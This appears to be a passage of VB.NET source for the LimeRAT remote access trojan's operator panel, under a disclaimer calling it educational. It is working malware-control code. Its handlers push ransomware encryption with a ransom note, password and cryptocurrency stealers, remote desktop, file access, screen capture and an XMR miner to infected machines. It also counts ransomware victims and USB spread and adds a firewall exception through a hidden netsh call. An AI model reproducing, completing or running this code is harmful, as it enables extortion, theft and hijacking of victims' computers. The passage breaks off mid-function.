'##################################################################
'##        N Y A N   C A T  |||   Updated on JAN./16/2019        ##
'##################################################################
'##                                                              ##
'##                                                              ##
'##                                                              ##
'##            ░░░░░░░░░░▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄░░░░░░░░░           ##
'##            ░░░░░░░░▄▀░░░░░░░░░░░░▄░░░░░░░▀▄░░░░░░░           ##
'##            ░░░░░░░░█░░▄░░░░▄░░░░░░░░░░░░░░█░░░░░░░           ##
'##            ░░░░░░░░█░░░░░░░░░░░░▄█▄▄░░▄░░░█░▄▄▄░░░           ##
'##            ░▄▄▄▄▄░░█░░░░░░▀░░░░▀█░░▀▄░░░░░█▀▀░██░░           ##
'##            ░██▄▀██▄█░░░▄░░░░░░░██░░░░▀▀▀▀▀░░░░██░░           ##
'##            ░░▀██▄▀██░░░░░░░░▀░██▀░░░░░░░░░░░░░▀██░           ##
'##            ░░░░▀████░▀░░░░▄░░░██░░░▄█░░░░▄░▄█░░██░           ##
'##            ░░░░░░░▀█░░░░▄░░░░░██░░░░▄░░░▄░░▄░░░██░           ##
'##            ░░░░░░░▄█▄░░░░░░░░░░░▀▄░░▀▀▀▀▀▀▀▀░░▄▀░░           ##
'##            ░░░░░░█▀▀█████████▀▀▀▀████████████▀░░░░           ##
'##            ░░░░░░████▀░░███▀░░░░░░▀███░░▀██▀░░░░░░           ##
'##            ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░           ##
'##                                                              ##
'##                           .. LimeRAT ..                      ##
'##                                                              ##
'##                                                              ##
'##                                                              ##
'##################################################################
'##    This project was created for educational purposes only    ##
'##################################################################
'##            https://github.com/NYAN-x-CAT/Lime-RAT            ##
'##################################################################
'##  This software's main purpose is NOT to be used maliciously  ##
'##################################################################
'## I am not responsible For any actions caused by this software ##
'##################################################################


Imports Mono.Cecil
Imports Mono.Cecil.Cil

Public Class Main

    Public S As S_TcpListener
    Public C As S_Client
    Public SPL = S_Settings.SPL

#Region "Form Events"

    Private Sub Main_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        CheckForIllegalCrossThreadCalls = False
        S_Messages.M = Me
        ' MetroLabel3.Text = Nothing
        Text = Text + " " + S_Settings.StubVer
        Try : PingClients.Interval = My.Settings.PING_VALUE * 1000 : Catch : End Try
        Try : My.Computer.Audio.Play(My.Resources.Intro, AudioPlayMode.Background) : Catch : End Try 'https://freesound.org/people/eardeer/sounds/385281/

        Try
            Dim xDoc As XElement = XElement.Load("Misc/USERS.xml")
            For Each item As XElement In xDoc...<Item>
                Dim lvItem As New ListViewItem(item...<LOC>.Value, 0)
                lvItem.SubItems.Add(item...<IP>.Value)
                lvItem.SubItems.Add(item...<ID>.Value)
                lvItem.SubItems.Add(item...<USER>.Value)
                lvItem.SubItems.Add(item...<VERSION>.Value)
                lvItem.SubItems.Add(item...<OS>.Value)
                lvItem.SubItems.Add(item...<INSTALL>.Value)
                lvItem.SubItems.Add(item...<AV>.Value)
                lvItem.SubItems.Add(item...<RANS>.Value)
                lvItem.SubItems.Add(item...<XMR>.Value)
                lvItem.SubItems.Add(item...<SP>.Value)
                lvItem.SubItems.Add(item...<PORT>.Value)
                lvItem.SubItems.Add(item...<DEP>.Value)
                lvItem.SubItems.Add(item...<PING>.Value)
                lvItem.SubItems.Add(item...<NOTE>.Value)
                lvItem.ForeColor = Color.Red
                L1.Items.AddRange(New ListViewItem() {lvItem})
            Next
            L1.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize)
        Catch ex As Exception
        End Try

        Try
            AddHandler S_Client.Read, AddressOf S_Messages.Read
            For Each x In S_Settings.PORT.ToList
                S = New S_TcpListener
                Dim T As New Threading.Thread(AddressOf S.Start)
                T.Start(x)
            Next
        Catch ex As Exception
            MsgBox(ex.Message)
            End
        End Try

        Try
            Main_Rightclick.Renderer = New MyRenderer()
        Catch ex As Exception
        End Try

        BackgroundWorker1.RunWorkerAsync()

    End Sub

    Private Sub Main_FormClosing(sender As Object, e As FormClosingEventArgs) Handles Me.FormClosing

        Try
            If L1.Items.Count > 0 Then
                Dim lviList As New List(Of ListViewItem)
                For Each item As ListViewItem In L1.Items
                    lviList.Add(item)
                Next
                Dim xDoc As XElement =
                            <Items>
                                <%= From lvi As ListViewItem In lviList Select
                                    <Item>
                                        <LOC><%= lvi.Text %></LOC>
                                        <IP><%= lvi.SubItems(1).Text %></IP>
                                        <ID><%= lvi.SubItems(2).Text %></ID>
                                        <USER><%= lvi.SubItems(3).Text %></USER>
                                        <VERSION><%= lvi.SubItems(4).Text %></VERSION>
                                        <OS><%= lvi.SubItems(5).Text %></OS>
                                        <INSTALL><%= lvi.SubItems(6).Text %></INSTALL>
                                        <AV><%= lvi.SubItems(7).Text %></AV>
                                        <RANS><%= lvi.SubItems(8).Text %></RANS>
                                        <XMR><%= lvi.SubItems(9).Text %></XMR>
                                        <SP><%= lvi.SubItems(10).Text %></SP>
                                        <PORT><%= lvi.SubItems(11).Text %></PORT>
                                        <DEP><%= lvi.SubItems(12).Text %></DEP>
                                        <PING><%= "Offline" %></PING>
                                        <NOTE><%= lvi.SubItems(14).Text %></NOTE>
                                    </Item> %>
                            </Items>

                xDoc.Save("MISC/USERS.xml")
            End If
        Catch ex As Exception
        End Try

        My.Settings.Save()


        Try
            NotifyIcon1.Dispose()
            Application.Exit()
            End
        Catch : End Try
    End Sub

    Private Sub BackgroundWorker1_DoWork(sender As Object, e As System.ComponentModel.DoWorkEventArgs) Handles BackgroundWorker1.DoWork
        Try
            Using WC As New Net.WebClient()
                Dim reply As String = WC.DownloadString("https://pastebin.com/raw/9kHA6nwH")
                If reply <> S_Settings.StubVer Then
                    S_Messages.Messages("{ New update is available! }", "github.com/NYAN-x-CAT/Lime-RAT/releases")
                ElseIf reply = S_Settings.StubVer Then
                    S_Messages.Messages("{ You are using the latest version! }", "Found bug? github.com/NYAN-x-CAT/Lime-RAT/issues/new")
                End If
                WC.Dispose()
            End Using
        Catch ex As Exception
        End Try


        Dim Client As Net.Sockets.TcpClient = Nothing
        Dim PortLabel As New Text.StringBuilder
        For Each ThePort In S_Settings.PORT
            Try
                If GetExternalAddress() = "127.0.0.1" Then
                    PortLabel.Append(String.Format(" {0}=OPENED ", ThePort))
                    MetroLabel3.Text = String.Format("IP={0} {1} KEY={2}", GetExternalAddress, PortLabel.ToString, S_Settings.EncryptionKey)
                    MetroLabel3.ForeColor = Color.Lime
                Else
                    Client = New Net.Sockets.TcpClient
                    Client.Connect(GetExternalAddress, ThePort)
                    PortLabel.Append(String.Format(" {0}=OPENED ", ThePort))
                    MetroLabel3.Text = String.Format("IP={0} {1} KEY={2}", GetExternalAddress, PortLabel.ToString, S_Settings.EncryptionKey)
                    MetroLabel3.ForeColor = Color.Lime
                End If
            Catch ex As Net.Sockets.SocketException
                MetroProgressSpinner1.Spinning = False
                PortLabel.Append(String.Format(" {0}=CLOSED ", ThePort))
                MetroLabel3.Text = String.Format("IP={0}  {1}  KEY={2}", GetExternalAddress, PortLabel.ToString, S_Settings.EncryptionKey)
                MetroLabel3.ForeColor = Color.Red
                'Try : My.Computer.Audio.Play(My.Resources._Error, AudioPlayMode.Background) : Catch : End Try 'https://freesound.org/people/eardeer/sounds/385281/

                If GTV("FW") = Nothing Then
                    Dim result As DialogResult = MessageBox.Show("Port " & ThePort & " seems to be blocked" + Environment.NewLine + "Do you want to add LimeRAT into firewall exception", "", MessageBoxButtons.YesNo)
                    If result = DialogResult.Yes Then
                        Try
                            STV("FW", "1")
                            Dim process As New Process()
                            process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden
                            process.StartInfo.FileName = "cmd.exe"
                            process.StartInfo.UseShellExecute = True
                            process.StartInfo.Verb = "runas"
                            process.StartInfo.Arguments = "/c netsh advfirewall firewall add rule name=""LimeRAT"" dir=in action=allow program=""" & Application.ExecutablePath & """ enable=yes"
                            process.Start()
                            process.WaitForExit()
                            Process.Start(Application.ExecutablePath)
                            End
                        Catch ex1 As Exception
                        End Try
                    End If
                End If
            Finally
                Try : Client.Close() : Catch : End Try
            End Try
        Next

    End Sub


#End Region


#Region "Server Events"

    Public List_PWD As New List(Of String)
    Public List_DE As New List(Of String)
    Public List_MINER As New List(Of String)
    Public List_PERS As New List(Of String)
    Public CHK_PWD As Boolean = False
    Public PathEXE As String = ""
    Public CHK_DE As Boolean = False
    Public _MINER_SETTINGS As String = ""
    Public CHK_MINER As Boolean = False
    Public CHK_PERS As Boolean = False

#End Region


#Region "Thumbnail"

    Private Sub CAPstart_Click(sender As Object, e As EventArgs) Handles CAPstart.Click
        If CAPstart.Text = "START" Then

            CAP.Interval = CAPsec.Value * 1000
            CAP.Enabled = True
            CAP.Start()
            CAPstart.Text = "STOP"

        Else

            Try
                CAP.Dispose()
                CAPstart.Text = "START"
                L3.Items.Clear()
            Catch ex As Exception
            End Try

        End If

    End Sub


    Private Async Sub Timer4_Tick(sender As Object, e As EventArgs) Handles CAP.Tick
        Dim M As New IO.MemoryStream
        Dim CMD As Byte() = SB(S_Encryption.AES_Encrypt("!CAP"))
        Await M.WriteAsync(CMD, 0, CMD.Length)
        Await M.WriteAsync(SB(S_Settings.EOF), 0, S_Settings.EOF.Length)
        Try
            For Each x In S_Settings.Online.ToList
                Dim CL As S_Client = CType(x, S_Client)
                If Not x.L.SubItems(PING.Index).Text.ToString.Contains("Offline") Then
                    CL.Send(M.ToArray)
                End If
            Next
        Catch ex As Exception
            C.isDisconnected()
        End Try

        Try
            M.Dispose()
        Catch ex As Exception
        End Try
    End Sub

#End Region


#Region "Theme"


    Private Sub L2_DrawItem(sender As System.Object, e As DrawItemEventArgs) Handles L2.DrawItem
        Try
            Dim W As New SolidBrush(Color.FromArgb(225, 225, 225))
            Dim L As New SolidBrush(Color.FromArgb(142, 188, 0))

            e.DrawBackground()

            If L2.Items(e.Index).ToString.Contains("Connected") OrElse L2.Items(e.Index).ToString.Contains("Reconnected") Then
                e.Graphics.DrawString(L2.Items(e.Index).ToString(), e.Font, L, New PointF(e.Bounds.X, e.Bounds.Y))

            ElseIf L2.Items(e.Index).ToString.Contains("Disconnected") Then
                e.Graphics.DrawString(L2.Items(e.Index).ToString(), e.Font, Brushes.DarkRed, New PointF(e.Bounds.X, e.Bounds.Y))

            ElseIf L2.Items(e.Index).ToString.Contains("Error!") Then
                e.Graphics.DrawString(L2.Items(e.Index).ToString(), e.Font, Brushes.Red, New PointF(e.Bounds.X, e.Bounds.Y))

            ElseIf L2.Items(e.Index).ToString.Contains("Established!") Then
                e.Graphics.DrawString(L2.Items(e.Index).ToString(), e.Font, Brushes.LightSteelBlue, New PointF(e.Bounds.X, e.Bounds.Y))

            ElseIf L2.Items(e.Index).ToString.Contains("Flood!") Then
                e.Graphics.DrawString(L2.Items(e.Index).ToString(), e.Font, Brushes.Olive, New PointF(e.Bounds.X, e.Bounds.Y))

            Else
                e.Graphics.DrawString(L2.Items(e.Index).ToString(), e.Font, W, New PointF(e.Bounds.X, e.Bounds.Y))
            End If
            e.DrawFocusRectangle()
        Catch ex As Exception
        End Try

    End Sub


    Private Sub L2_Click(sender As Object, e As EventArgs) Handles L2.Click
        L2.ClearSelected()
    End Sub



    Class ListViewComparer
        Implements IComparer

        Private m_ColumnNumber As Integer
        Private m_SortOrder As SortOrder

        Public Sub New(ByVal column_number As Integer, ByVal _
            sort_order As SortOrder)
            m_ColumnNumber = column_number
            m_SortOrder = sort_order
        End Sub

        Public Function Compare(ByVal x As Object, ByVal y As _
            Object) As Integer Implements _
            System.Collections.IComparer.Compare
            Dim item_x As ListViewItem = DirectCast(x,
                ListViewItem)
            Dim item_y As ListViewItem = DirectCast(y,
                ListViewItem)

            Dim string_x As String
            If item_x.SubItems.Count <= m_ColumnNumber Then
                string_x = ""
            Else
                string_x = item_x.SubItems(m_ColumnNumber).Text
            End If

            Dim string_y As String
            If item_y.SubItems.Count <= m_ColumnNumber Then
                string_y = ""
            Else
                string_y = item_y.SubItems(m_ColumnNumber).Text
            End If

            If m_SortOrder = SortOrder.Ascending Then
                If IsNumeric(string_x) And IsNumeric(string_y) _
                    Then
                    Return Val(string_x).CompareTo(Val(string_y))
                ElseIf IsDate(string_x) And IsDate(string_y) _
                    Then
                    Return DateTime.Parse(string_x).CompareTo(DateTime.Parse(string_y))
                Else
                    Return String.Compare(string_x, string_y)
                End If
            Else
                If IsNumeric(string_x) And IsNumeric(string_y) _
                    Then
                    Return Val(string_y).CompareTo(Val(string_x))
                ElseIf IsDate(string_x) And IsDate(string_y) _
                    Then
                    Return DateTime.Parse(string_y).CompareTo(DateTime.Parse(string_x))
                Else
                    Return String.Compare(string_y, string_x)
                End If
            End If
        End Function
    End Class

    Private Sub MetroTabPage1_Enter(sender As Object, e As EventArgs) Handles MetroTabControl1.Click
        On Error Resume Next
        L1.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize)
    End Sub

    Private Sub MetroToggle1_CheckedChanged(sender As Object, e As EventArgs) Handles MetroToggle1.CheckedChanged
        On Error Resume Next
        If MetroToggle1.Checked = True Then
            Dim simpleSound As New Media.SoundPlayer("c:\Windows\Media\Speech On.wav")
            simpleSound.Play()
        Else
            Dim simpleSound As New Media.SoundPlayer("c:\Windows\Media\Speech Off.wav")
            simpleSound.Play()
        End If

    End Sub

    Private Sub Main_Resize(sender As Object, e As EventArgs) Handles Me.Resize
        On Error Resume Next
        L1.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize)
    End Sub

    Private Sub L1_KeyDown(sender As Object, e As KeyEventArgs) Handles L1.KeyDown
        If e.KeyCode = Keys.A AndAlso e.Control Then
            For Each item As ListViewItem In L1.Items
                item.Selected = True
            Next
        End If
    End Sub

    Public Function KeyCount()
        Try
            If Not IO.Directory.Exists("Users") Then
                IO.Directory.CreateDirectory("Users")
            End If

            Dim fileCount As Integer = IO.Directory.GetFiles("Users", "KEY.txt", IO.SearchOption.AllDirectories).Length
            Return fileCount
        Catch ex As Exception
            Return "0"
        End Try
    End Function

    Public Function SpreadCount()
        Try
            Dim count As Integer = 0
            For Each x As ListViewItem In L1.Items
                If x.SubItems(SP.Index).Text.Contains("Spreaded!") Then
                    count += 1
                End If
            Next
            Return count
        Catch ex As Exception
            Return "0"
        End Try
    End Function

    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles LabelUpdate.Tick
        Try
            MetroLabel1.Text = "ONLINE CLIENTS [" & S_Settings.Online.Count & "]        SELECTED CLIENTS [" & L1.SelectedItems.Count & "]        TOTAL RANSOMWARE ATTACKS [" & KeyCount() & "]        TOTAL USB SPREAD [" & SpreadCount() & "]"
        Catch ex As Exception
        End Try
    End Sub

    Private Sub L1_DrawColumnHeader(ByVal sender As Object, ByVal e As DrawListViewColumnHeaderEventArgs) Handles L1.DrawColumnHeader
        Dim BL As New SolidBrush(Color.FromArgb(17, 17, 17))
        Dim LM As New SolidBrush(Color.FromArgb(142, 188, 0))
        e.DrawBackground()
        e.Graphics.FillRectangle(BL, e.Bounds)
        Dim headerFont As New Font("Segoe UI", 8, FontStyle.Bold)
        e.Graphics.DrawString(e.Header.Text, headerFont, LM, e.Bounds)
    End Sub

    Private Sub L1_DrawItem(sender As Object, e As DrawListViewItemEventArgs) Handles L1.DrawItem
        If e.Item.Selected = False Then
            e.DrawDefault = True
        End If
    End Sub

    Private Sub L1_DrawSubItem(sender As Object, e As DrawListViewSubItemEventArgs) Handles L1.DrawSubItem
        If e.Item.Selected = True Then
            e.Graphics.FillRectangle(New SolidBrush(Color.FromArgb(142, 188, 0)), e.Bounds)
            TextRenderer.DrawText(e.Graphics, e.SubItem.Text, New Font("Segoe UI", 8, FontStyle.Regular), New Point(e.Bounds.Left + 3, e.Bounds.Top + 2), Color.FromArgb(17, 17, 17))
        Else
            e.DrawDefault = True
        End If
    End Sub

    Private m_SortingColumn As ColumnHeader
    Private Sub L1_ColumnClick(ByVal sender As System.Object, ByVal e As ColumnClickEventArgs) Handles L1.ColumnClick
        On Error Resume Next
        Dim new_sorting_column As ColumnHeader = L1.Columns(e.Column)

        Dim sort_order As System.Windows.Forms.SortOrder
        If m_SortingColumn Is Nothing Then
            sort_order = SortOrder.Ascending
        Else
            If new_sorting_column.Equals(m_SortingColumn) Then
                If m_SortingColumn.Text.StartsWith("> ") Then
                    sort_order = SortOrder.Descending
                Else
                    sort_order = SortOrder.Ascending
                End If
            Else
                sort_order = SortOrder.Ascending
            End If

            m_SortingColumn.Text =
                m_SortingColumn.Text.Substring(2)
        End If

        m_SortingColumn = new_sorting_column
        If sort_order = SortOrder.Ascending Then
            m_SortingColumn.Text = "> " & m_SortingColumn.Text
        Else
            m_SortingColumn.Text = "< " & m_SortingColumn.Text
        End If

        L1.ListViewItemSorter = New ListViewComparer(e.Column, sort_order)

        L1.Sort()
        L1.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize)

    End Sub

    Public Class MyRenderer
        Inherits ToolStripProfessionalRenderer
        Protected Overloads Overrides Sub OnRenderMenuItemBackground(ByVal e As ToolStripItemRenderEventArgs)
            Dim rc As New Rectangle(Point.Empty, e.Item.Size)
            Dim c As Color = IIf(e.Item.Selected, Color.FromArgb(99, 131, 0), Color.FromArgb(17, 17, 17))
            Using brush As New SolidBrush(c)
                e.Graphics.FillRectangle(brush, rc)
            End Using
        End Sub
    End Class

#End Region


#Region "Rightclick"

#Region "Plugins"

    Private Async Sub RemoteDesktopToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RemoteDesktopToolStripMenuItem.Click
        If L1.Items.Count > 0 Then
            Try
                Dim CMD As Byte() = SB(S_Encryption.AES_Encrypt("CPL" + SPL + getMD5Hash(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\RDP.dll"))))
                Dim M As New IO.MemoryStream
                Await M.WriteAsync(CMD, 0, CMD.Length)
                Await M.WriteAsync(SB(S_Settings.EOF), 0, S_Settings.EOF.Length)

                For Each x As ListViewItem In L1.SelectedItems
                    If Not x.SubItems(PING.Index).Text.ToString.Contains("Offline") Then
                        Dim CL As S_Client = CType(x.Tag, S_Client)
                        x.BackColor = Color.DarkSlateGray
                        CL.Send(M.ToArray)
                    End If
                Next

                Try
                    Await M.FlushAsync
                    M.Dispose()
                Catch ex As Exception
                End Try

            Catch ex As Exception
                MsgBox(ex.Message, MsgBoxStyle.Critical)
                Exit Sub
            End Try
        End If
    End Sub

    Public Shared RANS_IMG
    Public Shared RANS_TEXT
    Private Async Sub EncryptToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles EncryptToolStripMenuItem.Click
        If L1.Items.Count > 0 Then
            Dim M As New IO.MemoryStream

            Try
                Dim R As New Ransomware
                R.ShowDialog()
                Dim result As DialogResult
                If R.OK = True Then
                    RANS_IMG = Convert.ToBase64String(IO.File.ReadAllBytes(R.PictureBox1.ImageLocation))
                    RANS_TEXT = R.RichTextBox1.Text
                    Dim CMD As Byte() = SB(S_Encryption.AES_Encrypt("CPL" + SPL + getMD5Hash(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\ENC.dll"))))
                    Await M.WriteAsync(CMD, 0, CMD.Length)
                    Await M.WriteAsync(SB(S_Settings.EOF), 0, S_Settings.EOF.Length)

                    For Each x As ListViewItem In L1.SelectedItems
                        If Not x.SubItems(PING.Index).Text.ToString.Contains("Offline") Then
                            Dim CL As S_Client = CType(x.Tag, S_Client)
                            If x.SubItems(RANS.Index).Text = "Encryption in progress..." OrElse x.SubItems(RANS.Index).Text = "Decryption in progress..." Then
                                result = MessageBox.Show("Task is already in progress! Please wait until it's done. " & vbNewLine & vbNewLine & "This might corrupt all files, Do you still want to countine? ", "", MessageBoxButtons.YesNo)
                                If result = DialogResult.Yes Then
                                    x.BackColor = Color.DarkSlateGray
                                    CL.Send(M.ToArray)
                                End If
                            Else
                                x.BackColor = Color.DarkSlateGray
                                CL.Send(M.ToArray)
                            End If
                        End If
                    Next
                End If

                Try
                    Await M.FlushAsync
                    M.Dispose()
                    R.Close()
                Catch ex As Exception
                End Try

            Catch ex As Exception
                MsgBox(ex.Message, MsgBoxStyle.Critical)
                Exit Sub
            End Try
        End If


    End Sub

    Private Async Sub DecryptionToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DecryptionToolStripMenuItem.Click
        Try
            If L1.Items.Count > 0 Then
                Dim M As New IO.MemoryStream
                Dim CMD As Byte() = SB(S_Encryption.AES_Encrypt("CPL" + SPL + getMD5Hash(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\DEC.dll"))))
                Await M.WriteAsync(CMD, 0, CMD.Length)
                Await M.WriteAsync(SB(S_Settings.EOF), 0, S_Settings.EOF.Length)

                For Each x As ListViewItem In L1.SelectedItems
                    If Not x.SubItems(PING.Index).Text.ToString.Contains("Offline") Then
                        Dim CL As S_Client = CType(x.Tag, S_Client)
                        If x.SubItems(RANS.Index).Text = "Encryption in progress..." OrElse x.SubItems(RANS.Index).Text = "Decryption in progress..." Then
                            Dim result As DialogResult
                            result = MessageBox.Show("Task is already in progress! Please wait until it's done. " & vbNewLine & vbNewLine & "This might corrupt all files, Do you still want to countine? ", "", MessageBoxButtons.YesNo)
                            If result = DialogResult.Yes Then
                                x.BackColor = Color.DarkSlateGray
                                CL.Send(M.ToArray)
                            End If
                        Else
                            x.BackColor = Color.DarkSlateGray
                            CL.Send(M.ToArray)
                        End If
                    End If
                Next

                Try
                    Await M.FlushAsync
                    M.Dispose()
                Catch ex As Exception
                End Try
            End If
        Catch ex As Exception
            MsgBox(ex.Message, MsgBoxStyle.Critical)
            Exit Sub
        End Try

    End Sub

    Private Async Sub FIleManagerToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles FIleManagerToolStripMenuItem.Click
        Try
            If L1.Items.Count > 0 Then
                Dim M As New IO.MemoryStream
                Dim CMD As Byte() = SB(S_Encryption.AES_Encrypt("CPL" + SPL + getMD5Hash(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\FM.dll"))))
                Await M.WriteAsync(CMD, 0, CMD.Length)
                Await M.WriteAsync(SB(S_Settings.EOF), 0, S_Settings.EOF.Length)

                For Each x As ListViewItem In L1.SelectedItems
                    Dim FM As File_Manager = My.Application.OpenForms("FM" + x.SubItems(USERN.Index).Text + "_" + x.SubItems(ID.Index).Text)
                    If FM Is Nothing AndAlso Not x.SubItems(PING.Index).Text.ToString.Contains("Offline") Then
                        Dim CL As S_Client = CType(x.Tag, S_Client)
                        x.BackColor = Color.DarkSlateGray
                        CL.Send(M.ToArray)
                    End If
                Next


                Try
                    Await M.FlushAsync
                    M.Dispose()
                Catch ex As Exception
                End Try
            End If
        Catch ex As Exception
            MsgBox(ex.Message, MsgBoxStyle.Critical)
            Exit Sub
        End Try
    End Sub

    Private Async Sub DetailsToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DetailsToolStripMenuItem.Click
        Try
            If L1.Items.Count > 0 Then
                Dim M As New IO.MemoryStream
                Dim CMD As Byte() = SB(S_Encryption.AES_Encrypt("CPL" + SPL + getMD5Hash(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\DET.dll"))))
                Await M.WriteAsync(CMD, 0, CMD.Length)
                Await M.WriteAsync(SB(S_Settings.EOF), 0, S_Settings.EOF.Length)

                For Each x As ListViewItem In L1.SelectedItems
                    Dim n As System_Manager = My.Application.OpenForms("Info" + x.SubItems(ID.Index).Text)
                    If n Is Nothing AndAlso Not x.SubItems(PING.Index).Text.ToString.Contains("Offline") Then
                        Dim CL As S_Client = CType(x.Tag, S_Client)
                        x.BackColor = Color.DarkSlateGray
                        CL.Send(M.ToArray)
                    End If
                Next

                Try
                    Await M.FlushAsync
                    M.Dispose()
                Catch ex As Exception
                End Try
            End If
        Catch ex As Exception
            MsgBox(ex.Message, MsgBoxStyle.Critical)
            Exit Sub
        End Try
    End Sub

    Private Async Sub STOPToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles STOPToolStripMenuItem.Click
        Try
            If L1.Items.Count > 0 Then
                Dim M As New IO.MemoryStream
                Dim CMD As Byte() = SB(S_Encryption.AES_Encrypt("CPL" + SPL + getMD5Hash(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\LOCS.dll"))))
                Await M.WriteAsync(CMD, 0, CMD.Length)
                Await M.WriteAsync(SB(S_Settings.EOF), 0, S_Settings.EOF.Length)

                For Each x As ListViewItem In L1.SelectedItems
                    If Not x.SubItems(PING.Index).Text.ToString.Contains("Offline") Then
                        Dim CL As S_Client = CType(x.Tag, S_Client)
                        x.BackColor = Color.DarkSlateGray
                        CL.Send(M.ToArray)
                    End If
                Next

                Try
                    Await M.FlushAsync
                    M.Dispose()
                Catch ex As Exception
                End Try
            End If
        Catch ex As Exception
            MsgBox(ex.Message, MsgBoxStyle.Critical)
            Exit Sub
        End Try
    End Sub

    Private Async Sub STARTToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles STARTToolStripMenuItem.Click
        Try
            If L1.Items.Count > 0 Then
                Dim M As New IO.MemoryStream
                Dim CMD As Byte() = SB(S_Encryption.AES_Encrypt("CPL" + SPL + getMD5Hash(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\LOC.dll"))))
                Await M.WriteAsync(CMD, 0, CMD.Length)
                Await M.WriteAsync(SB(S_Settings.EOF), 0, S_Settings.EOF.Length)

                For Each x As ListViewItem In L1.SelectedItems
                    If Not x.SubItems(PING.Index).Text.ToString.Contains("Offline") Then
                        Dim CL As S_Client = CType(x.Tag, S_Client)
                        x.BackColor = Color.DarkSlateGray
                        CL.Send(M.ToArray)
                    End If
                Next

                Try
                    Await M.FlushAsync
                    M.Dispose()
                Catch ex As Exception
                End Try
            End If
        Catch ex As Exception
            MsgBox(ex.Message, MsgBoxStyle.Critical)
            Exit Sub
        End Try
    End Sub

    Public PW_F As Boolean = False
    Private Async Sub PasswordsToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles PasswordsToolStripMenuItem.Click
        Try
            If L1.Items.Count > 0 Then
                Dim M As New IO.MemoryStream
                Dim CMD As Byte() = SB(S_Encryption.AES_Encrypt("CPL" + SPL + getMD5Hash(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\PWD.dll"))))
                Await M.WriteAsync(CMD, 0, CMD.Length)
                Await M.WriteAsync(SB(S_Settings.EOF), 0, S_Settings.EOF.Length)

                For Each x As ListViewItem In L1.SelectedItems
                    If Not x.SubItems(PING.Index).Text.ToString.Contains("Offline") Then
                        Dim CL As S_Client = CType(x.Tag, S_Client)
                        x.BackColor = Color.DarkSlateGray
                        CL.Send(M.ToArray)
                        PW_F = True
                    End If
                Next

                Try
                    Await M.FlushAsync
                    M.Dispose()
                Catch ex As Exception
                End Try
            End If
        Catch ex As Exception
            MsgBox(ex.Message, MsgBoxStyle.Critical)
            Exit Sub
        End Try
    End Sub

    Private Async Sub CryptocurrencyStealerToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CryptocurrencyStealerToolStripMenuItem.Click
        Try
            If L1.Items.Count > 0 Then
                S_Messages.Messages("Crypto currency Stealer", "Client must be .NET 4.0")

                Dim M As New IO.MemoryStream
                Dim CMD As Byte() = SB(S_Encryption.AES_Encrypt("CPL" + SPL + getMD5Hash(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\CRYP.dll"))))
                Await M.WriteAsync(CMD, 0, CMD.Length)
                Await M.WriteAsync(SB(S_Settings.EOF), 0, S_Settings.EOF.Length)

                For Each x As ListViewItem In L1.SelectedItems
                    If Not x.SubItems(PING.Index).Text.ToString.Contains("Offline") Then
                        Dim CL As S_Client = CType(x.Tag, S_Client)
                        x.BackColor = Color.DarkSlateGray
                        CL.Send(M.ToArray)
                    End If
                Next

                Try
                    Await M.FlushAsync
                    M.Dispose()
                Catch ex As Exception
                End Try
            End If
        Catch ex As Exception
            MsgBox(ex.Message, MsgBoxStyle.Critical)
            Exit Sub
        End Try
    End Sub

    Private Async Sub XMRMinerToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles XMRMinerToolStripMenuItem.Click
        Try
            If L1.SelectedItems.Count > 0 Then
                Dim miner As New XMR
                miner.ShowDialog()
                Dim PLG = Convert.ToBase64String(Await GZip(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\MISC.dll"), True))
                Dim F = Convert.ToBase64String(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\XMR.dll"))
                Dim CMD As Byte() = Nothing
                If miner.C = True Then
                    CMD = SB(S_Encryption.AES_Encrypt("IPLM" + SPL + PLG + SPL + "XMR-R|'P'|" + miner.cus + "|'P'|" + "x" + "|'P'|" + "x" + "|'P'|" + "x" + "|'P'|" + F))
                Else
                    CMD = SB(S_Encryption.AES_Encrypt("IPLM" + SPL + PLG + SPL + "XMR-R|'P'|" + miner.cpu + "|'P'|" + miner.url + "|'P'|" + miner.user + "|'P'|" + miner.pass + "|'P'|" + F))
                End If
                Dim M As New IO.MemoryStream
                Await M.WriteAsync(CMD, 0, CMD.Length)
                Await M.WriteAsync(SB(S_Settings.EOF), 0, S_Settings.EOF.Length)

                Dim Kill As Byte() = SB(S_Encryption.AES_Encrypt("IPLM" + SPL + Convert.ToBase64String(Await GZip(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\MISC.dll"), True)) + SPL + "XMR-K|'P'|"))
                Dim MM As New IO.MemoryStream
                Await MM.WriteAsync(Kill, 0, Kill.Length)
                Await MM.WriteAsync(SB(S_Settings.EOF), 0, S_Settings.EOF.Length)

                For Each x As ListViewItem In L1.SelectedItems
                    Dim CL As S_Client = CType(x.Tag, S_Client)
                    If Not x.SubItems(PING.Index).Text.ToString.Contains("Offline") Then
                        If miner.OK = True AndAlso miner.K = False Then
